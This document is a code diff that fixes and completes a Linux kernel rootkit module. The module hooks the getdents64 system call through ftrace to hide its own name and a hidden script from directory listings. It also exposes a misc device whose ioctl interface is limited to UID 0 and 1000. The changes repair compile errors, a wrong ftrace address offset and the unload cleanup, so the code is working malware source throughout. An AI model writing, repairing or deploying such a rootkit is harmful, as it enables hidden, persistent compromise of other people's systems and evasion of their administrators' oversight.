@@ -22,13 +22,14 @@ struct ftrace_hook {
 typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
 
 static orig_getdents64_t orig_getdents64;
-static struct ftrace_hook getdents_hook
+static struct ftrace_hook getdents_hook;
 
 static asmlinkage long new_getdents64(const struct pt_regs *regs)
 {
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
-    long ret;
-    struct linux_dirent64 *kbuf, *cur;
+    long ret = 0;
+    struct linux_dirent64 *kbuf = NULL;
+    struct linux_dirent64 *cur = NULL;
     unsigned long bpos = 0;
 
     ret = orig_getdents64(regs);
@@ -46,7 +47,7 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
 
     while (bpos < ret) {
         cur = (struct linux_dirent64 *)((char *)kbuf + bpos);
-        if (strcmp(cur->d_name, NAME) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0) {
+        if (strcmp(cur->d_name, NAME_MODULE) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0) {
             unsigned short reclen = cur->d_reclen;
             memmove(cur, (char *)cur + reclen, ret - bpos - reclen);
             ret -= reclen;
@@ -103,7 +104,7 @@ static int install_hook(void)
     }
     pr_info("[+] %s @ 0x%lx\n", getdents_hook.name, getdents_hook.address);
 
-    orig_getdents64 = (orig_getdents64_t)(getdents_hook.address + MCOUNT_INSN_SIZE);
+    orig_getdents64 = (orig_getdents64_t)getdents_hook.address;
 
     getdents_hook.ops.func = hook_callback;
     getdents_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
@@ -170,7 +171,7 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 static int rk_open(struct inode *inode, struct file *file)
 {
     uid_t uid = current_uid().val;
-    if (uid != 0 or uid != 1000) {
+    if (uid != 0 && uid != 1000) {
         printk(KERN_ALERT "rootkit: accès refusé à l'UID %u\n", uid);
         return -EACCES;
     }
@@ -194,7 +195,7 @@ static const struct file_operations rk_fops = {
 
 static struct miscdevice rk_misc = {
     .minor = MISC_DYNAMIC_MINOR,
-    .name  = NAME,
+    .name  = NAME_MODULE,
     .fops  = &rk_fops,
 };
 
@@ -211,7 +212,7 @@ static int __init rootkit_init(void)
     ret = install_hook();
     
     if (ret) {
-        misc_deregister(&rootkit_dev);
+        misc_deregister(&rk_misc);
         return ret;
     }
 
@@ -222,11 +223,27 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-    unregister_ftrace_function(&getdents_hook.ops);
-    ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
+    if (getdents_hook.ops.func != NULL) {
+        int ret = unregister_ftrace_function(&getdents_hook.ops);
+        if (ret) {
+            printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
+        }
+    }
+
+    if (getdents_hook.address != 0) {
+        int ret = ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
+        if (ret) {
+            printk(KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n", ret);
+        }
+    }
+
+    synchronize_rcu();
+
     misc_deregister(&rk_misc);
+
     printk(KERN_INFO "rootkit: unloaded\n");
 }
+
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
